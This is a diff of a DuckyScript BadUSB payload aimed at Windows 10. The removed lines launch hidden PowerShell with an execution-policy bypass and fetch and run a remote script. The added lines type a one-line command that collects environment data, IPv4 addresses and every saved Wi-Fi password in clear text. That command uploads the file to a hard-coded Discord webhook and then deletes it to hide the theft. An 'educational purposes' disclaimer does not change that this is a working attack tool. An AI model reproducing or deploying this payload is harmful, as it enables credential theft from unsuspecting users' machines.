@@ -1,27 +1,23 @@
-REM ###################################################################
-REM #                                                                 |
-REM # Title        : WLAN-Windows-Passwords-Discord-Exfiltration      |
-REM # Author       : Aleff                                            |
-REM # Description: A script used to stole target WLAN Passwords.      |
-REM # Category     : Credentials                                      |
-REM # Target       : Windows 10-11                                    |
-REM # Version      : 1.0                                              |
-REM #                                                                 |
-REM ###################################################################
+REM Title:          Discord Windows Wifi IP-Info
+REM Description:    Grabs wifi passwords, environment data, IPv4 Network addresses, writes to a file, uploads it to Discord, then cleans up the file on the targets filesystem and exits. 
+REM Author:         Startrk1995
+REM Props:          Hak5 Team
+REM Version:        1.0
+REM Category:       Exfiltration
+REM Target:         Windows 10 (CMD + Powershell)
+REM Attackmodes:    HID
+REM Mandatory Info: Add your Discord Webhook URL in quotes with no spaces and with permission to post.
+REM Discord URL:    Example: https://discord.com/api/webhooks/123456789012345678/adjlfjlejlidsjasdlijflie_ajsdflkjaljeiljkdajlkjd
+REM Legal:          This script is for educational purposes only please do not use this for malicious purposes
 
-
-
-DELAY 10000
+DELAY 500
 GUI r
-DELAY 250
-STRING powershell -w h -ep bypass $discord='
+DELAY 200
+STRING powershell
+ENTER
+DELAY 1000
 
-REM REQUIRED - Provide Discord Webhook - https://discordapp.com/api/webhooks/<webhook_id>/<token>
-DEFINE DISCORD example.com
-STRING https://discord.com/api/webhooks/1148872565029343233/Vlwhulrs4XR2hgqGudUMHApVkimI9a9grXHfaweogpPu80MQetIR2A5fy5pLVBut6tTQ
+REM I have this as all one command for quickness.
 
-REM Reply example.com with YOUR LINK. The Payload should be Windows-Passwords.ps1
-DEFINE PAYLOAD example.com
-STRINGLN ';irm https://raw.githubusercontent.com/srikoushik123/bad-usb/main/wlan%20info/powershell%20-script.ps1 | iex
-DELAY 250
+STRING $url="https://discord.com/api/webhooks/1148872565029343233/Vlwhulrs4XR2hgqGudUMHApVkimI9a9grXHfaweogpPu80MQetIR2A5fy5pLVBut6tTQ";dir env: >> stats.txt; Get-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddress,SuffixOrigin | where IPAddress -notmatch '(127.0.0.1|169.254.\d+.\d+)' >> stats.txt;(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{PROFILE_NAME=$name;PASSWORD=$pass}} | Format-Table -AutoSize >> stats.txt;$Body=@{ content = "$env:computername Stats from Ducky/Pico"};Invoke-RestMethod -ContentType 'Application/Json' -Uri $url  -Method Post -Body ($Body | ConvertTo-Json);curl.exe -F "file1=@stats.txt" $url ; Remove-Item '.\stats.txt';exit
 ENTER
